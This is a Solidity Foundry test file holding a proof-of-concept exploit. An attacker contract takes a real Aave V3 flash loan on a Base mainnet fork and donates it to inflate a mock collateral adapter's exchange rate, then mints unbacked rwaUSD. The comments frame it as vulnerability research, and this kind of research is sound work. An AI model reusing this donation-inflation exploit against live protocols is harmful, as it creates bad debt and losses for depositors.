// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/rwaUSDToken.sol";
import "../../src/Ledger.sol";
import "../../src/PriceRouter.sol";
import "../../src/AccountManager.sol";
import "../../src/GoldAdapter.sol";
import "../../src/MockERC20.sol";
import "../../src/MockPriceFeed.sol";

/// @notice REAL Base-mainnet-fork PoC of the adapter-donation exploit (Vuln A), funded by a REAL
/// Aave V3 flash loan of REAL USDC — no `mint` cheat for the attack capital.
///
/// Guarded: the default offline suite (plain `forge test`) SKIPS this unless RED_QUEEN_FORK=1, and
/// it needs a Base RPC (defaults to the public endpoint). Run it with:
///   RED_QUEEN_FORK=1 forge test --match-path 'test/fork/RealFlashDonation.t.sol' -vv
///
/// What is real here: the fork state, USDC, the Aave V3 pool, the flash loan and its premium, and
/// the requirement that the loan be repaid in-transaction. What is still a mock: the vulnerable
/// adapter/ledger system (Multipli deploys no such adapter on Base — see MULTIPLI-BASE-RECON.md), so
/// USDC stands in as the collateral token the adapter custodies.
///
/// Honest result the fork forces out: the donation inflates the adapter rate and mints UNBACKED
/// rwaUSD (protocol bad debt), but the flash loan cannot be self-repaid from the protocol — the
/// donated USDC is stranded in the pool. So this is a solvency/bad-debt attack that COSTS the
/// attacker the donation (monetizable only by offloading the unbacked rwaUSD), not a free drain.

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IAavePool {
    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params,
                            uint16 referralCode) external;
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

/// Aave flash-loan receiver = the attacker. Runs the whole donation attack inside executeOperation.
contract FlashDonationAttacker {
    IAavePool public immutable pool;
    IERC20 public immutable usdc;
    AccountManager public immutable am;
    GoldAdapter public immutable adapter;
    Ledger public immutable ledger;
    rwaUSDToken public immutable rwa;
    address public immutable poolAddr;

    uint256 public rateBefore;
    uint256 public rateAfter;
    uint256 public unbackedMinted;

    constructor(IAavePool _pool, IERC20 _usdc, AccountManager _am, GoldAdapter _adapter,
                Ledger _ledger, rwaUSDToken _rwa, address _collatPool) {
        pool = _pool; usdc = _usdc; am = _am; adapter = _adapter; ledger = _ledger; rwa = _rwa;
        poolAddr = _collatPool;
    }

    function attack(uint256 loan) external {
        pool.flashLoanSimple(address(this), address(usdc), loan, "", 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata)
        external returns (bool)
    {
        require(msg.sender == address(pool), "only pool");
        require(asset == address(usdc), "asset");

        rateBefore = adapter.exchangeRate();

        // 1. Donate almost the whole flash loan straight into the collateral pool: inflates
        //    exchangeRate() without minting shares (the Edel/Vuln A mechanic), with REAL USDC.
        uint256 donation = amount - 1e6;            // keep 1 USDC to deposit
        usdc.transfer(poolAddr, donation);
        rateAfter = adapter.exchangeRate();

        // 2. Deposit 1 USDC, captured at the inflated rate, and mint rwaUSD against it.
        usdc.approve(address(adapter), 1e6);
        am.deposit(address(adapter), 1e6);
        uint256 minted = ledger.principal(address(this));
        am.mint(minted);
        unbackedMinted = rwa.balanceOf(address(this));

        // 3. Repay the flash loan + premium. The donated USDC is stranded in the pool, so this must
        //    be covered by the attacker's own USDC — proving the attack is not self-funding.
        uint256 owed = amount + premium;
        usdc.approve(address(pool), owed);
        return true;
    }
}

contract RealFlashDonation is Test {
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;   // real USDC on Base
    address constant AAVE = 0xA238Dd80C259a72e81d7e4664a9801593F98d1c5;   // real Aave V3 Pool on Base

    address admin = makeAddr("admin");
    address seedUser = makeAddr("seedUser");

    rwaUSDToken rwa;
    Ledger ledger;
    PriceRouter priceRouter;
    AccountManager am;
    GoldAdapter adapter;
    MockPriceFeed feed;
    address collatPool = makeAddr("collatPool");

    function setUp() public {
        if (!vm.envOr("RED_QUEEN_FORK", false)) return;   // skipped unless explicitly forked
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")));

        vm.startPrank(admin);
        rwa = new rwaUSDToken(admin);
        ledger = new Ledger(rwa);
        priceRouter = new PriceRouter(admin);
        am = new AccountManager(ledger, priceRouter, admin);
        rwa.setLedger(address(ledger));
        ledger.setAccountManager(address(am));

        // USDC is the collateral token the adapter custodies (cast to the mock's ERC20 type; the
        // ABI calls the adapter makes — transferFrom/transfer/balanceOf — are standard ERC20).
        adapter = new GoldAdapter(MockERC20(USDC), collatPool);
        adapter.setAccountManager(address(am));
        feed = new MockPriceFeed(admin, 1e18);            // $1 per USDC unit, 1e18-scaled
        priceRouter.registerAdapter(address(adapter), PriceRouter.Kind.GOLD, feed);
        am.registerAdapter(address(adapter));
        vm.stopPrank();

        // Seed an established pool with a legit first depositor (real USDC via foundry `deal`, a
        // setup bootstrap — the ATTACK capital comes from the real flash loan, not from deal).
        deal(USDC, seedUser, 1_000e6);
        vm.startPrank(seedUser);
        IERC20(USDC).approve(address(adapter), 1_000e6);
        am.deposit(address(adapter), 1_000e6);
        vm.stopPrank();
    }

    function test_realFlashLoanDonation() public {
        if (!vm.envOr("RED_QUEEN_FORK", false)) { vm.skip(true); return; }

        uint256 LOAN = 100_000e6;                          // 100k USDC, real Aave flash loan
        FlashDonationAttacker atk =
            new FlashDonationAttacker(IAavePool(AAVE), IERC20(USDC), am, adapter, ledger, rwa, collatPool);

        // The attacker's own capital: enough to cover the stranded donation on repay. This is the
        // attacker's REAL cost, measured below — not a mint of exploit proceeds.
        deal(USDC, address(atk), 101_000e6);
        uint256 attackerUsdcBefore = IERC20(USDC).balanceOf(address(atk));

        atk.attack(LOAN);

        uint256 attackerUsdcAfter = IERC20(USDC).balanceOf(address(atk));
        uint256 rateBefore = atk.rateBefore();
        uint256 rateAfter = atk.rateAfter();
        uint256 unbacked = atk.unbackedMinted();
        uint256 cost = attackerUsdcBefore - attackerUsdcAfter;   // real USDC the attacker spent

        emit log_named_uint("rate before (1e18)", rateBefore);
        emit log_named_uint("rate after  (1e18)", rateAfter);
        emit log_named_uint("rate inflation x", rateAfter / rateBefore);
        emit log_named_uint("UNBACKED rwaUSD minted (6dp via 1e18 principal)", unbacked);
        emit log_named_uint("attacker REAL USDC cost (6dp)", cost);

        // The real, fork-enforced assertions:
        assertGt(rateAfter, rateBefore * 10, "donation must inflate the rate >10x");
        assertGt(unbacked, 0, "attack must mint unbacked rwaUSD (protocol bad debt)");
        assertGt(cost, 0, "flash loan is NOT self-funding: attacker pays the stranded donation");
    }
}
